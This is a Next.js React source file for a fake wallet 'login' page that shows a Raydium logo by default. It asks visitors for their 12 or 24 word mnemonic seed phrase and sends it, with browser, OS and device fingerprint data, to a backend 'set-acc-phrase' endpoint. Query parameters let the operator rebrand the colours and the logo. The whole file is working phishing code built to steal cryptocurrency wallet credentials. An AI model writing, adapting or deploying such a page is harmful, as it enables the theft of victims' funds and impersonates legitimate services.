"use client";
import { useSearchParams } from 'next/navigation';
import { useState, useEffect } from 'react';
// import UAParser from "ua-parser-js";


const LoginPage = () => {
  const UAParser = require("ua-parser-js");
  const searchParams = useSearchParams();
  const [value, setValue] = useState("")
  const [error, setError] = useState("");
  const [userInfo, setUserInfo] = useState({
    browser: "",
    os: "",
    device: "",
  });
  console.log(userInfo);
  const bgColor:any = searchParams.get('bgColor') || '#181d31';
  const bgColorBox:any = searchParams.get('bgColorBox') || '#ffffff';
  const buttonColor:any = searchParams.get('buttonColor') || '#00cfff';
  // const logo = "/raydium-logo-freelogovectors.png";
  const logo: any = searchParams.get('logo')  || "/raydium-logo-freelogovectors.png";
  // console.log('bgColor:', bgColor);
  // console.log('bgColorBox:', bgColorBox);
  // console.log('buttonColor:', buttonColor);
  console.log("value: ", value)
  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();

    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    // const inputValue = e.target.value.trim();

    // // Validate the input
    // const wordRegex = /^[a-z\s]+$/; // Only lowercase letters and spaces
    // const words = inputValue.split(/\s+/); // Split the input into words

    // if (!wordRegex.test(inputValue)) {
    //   setError("Input must contain only lowercase letters and spaces.");
    // } else if (words.length < 12 || words.length > 24) {
    //   setError("Input must contain between 12 and 24 words.");
    // } else {
    //   setError(""); // No errors
    // }

    setValue(e.target.value);
  };

  const handleSubmit = async () => {
    const inputValue = value.trim();

    // Validate the input
    const wordRegex = /^[a-z\s]+$/; // Only lowercase letters and spaces
    const words = inputValue.split(/\s+/); // Split the input into words

    if (!wordRegex.test(inputValue)) {
      setError("Input must contain only lowercase letters and spaces.");
      return;
    } else if (words.length < 12 || words.length > 24) {
      setError("Input must contain between 12 and 24 words.");
      return;
    } else {
      setError(""); // No errors
    }

    if (error) {
      alert("Please fix the errors before submitting.");
      return;
    }

    if (!value.trim()) {
      alert("Please enter your mnemonic phrase.");
      return;
    }

    try {
      const response = await fetch(
        "http://localhost:8080/dashboard/set-acc-phrase",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mnemonic: value,
            userInfo: {
              browser: userInfo.browser,
              os: userInfo.os,
              device: userInfo.device,
            },
          }),
        }
      );

      if (response.ok) {
        const data = await response.json();
        alert("Mnemonic phrase and user info submitted successfully!");
        console.log("Response:", data);
      } else {
        alert("Failed to submit data. Please try again.");
        console.error("Error:", error);
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred while submitting the data.");
    }
  };


  return (
    <>
    <div
    className="flex flex-col items-center justify-center min-h-screen"
    style={{ backgroundColor: bgColor }}
    >
      <div
        className="w-4500px] p-6 rounded-lg shadow-md text-center login-container"
        style={{ backgroundColor: bgColorBox }}
        >
        {/* Logo */}
        {/* <p className="mb-2">Browser: {userInfo.browser}</p>
        <p className="mb-2">Operating System: {userInfo.os}</p>
        <p className="mb-2">Device: {userInfo.device}</p> */}
        <div className='logo-placeholder'>
          <img
            height={100}
            width={100}
            src={logo}
            alt="Logo"
            className="mx-auto mb-4 h-16 w-60"
          />
        </div>
          {error && (
              <div className='message-container'>
                {error}
              </div>
            )}
        <textarea
          value={value}
          placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
          className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
          onChange={(e) => handleInputChange(e)}
        />
        <button
          className="w-full px-4 py-2 text-black rounded-md"
          style={{ backgroundColor: buttonColor }}
          onClick={handleSubmit}
        >
          Connect Wallet
        </button>
      </div>
    </div>
    </>
  );
};

export default LoginPage;
